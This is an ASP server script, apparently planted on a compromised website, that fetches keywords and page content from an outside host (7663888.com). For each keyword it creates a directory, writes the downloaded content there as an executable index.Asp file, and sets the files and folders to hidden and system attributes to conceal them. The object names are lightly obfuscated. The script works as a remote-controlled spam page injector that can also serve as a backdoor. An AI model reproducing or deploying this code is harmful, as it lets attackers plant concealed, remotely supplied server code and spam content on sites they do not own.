<%
Server.ScriptTimeout=9999999
response.buffer =true
Randomize
keynum=Int((18 - 0 + 1) * Rnd + lowerbound)
dirnum="http://www.7663888.com/zqs/?keywords="&keynum&"&get=ok"
dirname=GetHttpPage(dirnum)
Set fso=Server.CreateObject("Scripting.FileSystemObject")
filepath=Server.MapPath("keywords.txt")
set fileOpen=fso.OpenTextfile(filepath,2,true)
fileOpen.write(dirname)
fileOpen.close
set fso=nothing
set fileOpen=nothing
Set fso=Server.CreateObject("Scripting.FileSystemObject")
Set fp=fso.OpenTextFile(Server.MapPath("keywords.txt"),1)

do while fp.AtEndOfStream = false
dir=dir&fp.readline
loop

Dim keyarr,dircon,folderPath
keyarr=split(dir,"|")
For I = Lbound(keyarr) to Ubound(keyarr)-1
'创建目录
if keyarr(i)="" then
keyarr(i)=keyarr(i+1)
end if
If not fso.folderexists(Server.MapPath(keyarr(i))) Then
fso.CreateFolder(Server.MapPath(keyarr(i)))
dirname="./"&keyarr(i)
'response.write dirname
dirname=Server.MapPath(dirname)
set dir=fso.GetFolder(dirname)
dir.attributes=39
Else
Response.write ""
End If 
'结束创建，开始生成文章页面
dirpathname=Request.ServerVariables("SCRIPT_NAME")
domain=request.ServerVariables("Server_NAME")&dirpathname
dircon=GetHttpPage("http://www.7663888.com/zqs/?keywords="&keynum&"&title="&keyarr(i)&"&domain="&domain)
If fso.fileexists(Server.MapPath(keyarr(i)&"\index.Asp")) Then
Response.write "文件已经存在，无法创建<br/>"
Else
fso.CreateTextFile(Server.MapPath(keyarr(i)&"\index.Asp"))
filename=keyarr(i)&"/index.Asp"
filepath=Server.MapPath(filename)
set fileOpen=fso.OpenTextfile(filepath,2,true)
fileOpen.write(dircon)
set file=fso.getfile(filepath)
file.attributes=39
Response.write "<a href="&keyarr(i)&"/index.asp>"&keyarr(i)&"</a>目录以及文件创建成功<br/>"
response.flush
End If 
Next
response.write Ubound(keyarr)&"个项目全部创建成功!"



Function GetHttpPage(HttpUrl)
   If IsNull(HttpUrl)=True Then
	  response.Write("?")
	  Exit Function
   End If
   On Error Resume Next
   Dim Http
   Set Http=server.createobject("MSX"&"ML2.XML"&"HTTP")
   Http.open "GET",HttpUrl,False
   Http.Send()
   If Http.Readystate<>4 then
	  Set Http=Nothing
	  response.Write("xxxx")
	  Exit function
   End if
   GetHttpPage=bytesToBSTR(Http.responseBody,"gb2312")
   Set Http=Nothing
   If Err.number<>0 then
	  Err.Clear
   End If
End Function

Function BytesToBstr(Body,Cset)
   Dim Objstream
   Set Objstream = Server.CreateObject("adod"&"b.stream")
   objstream.Type = 1
   objstream.Mode =3
   objstream.Open
   objstream.Write body
   objstream.Position = 0
   objstream.Type = 2
   objstream.Charset = Cset
   BytesToBstr = objstream.ReadText 
   objstream.Close
   set objstream = nothing
End Function
%>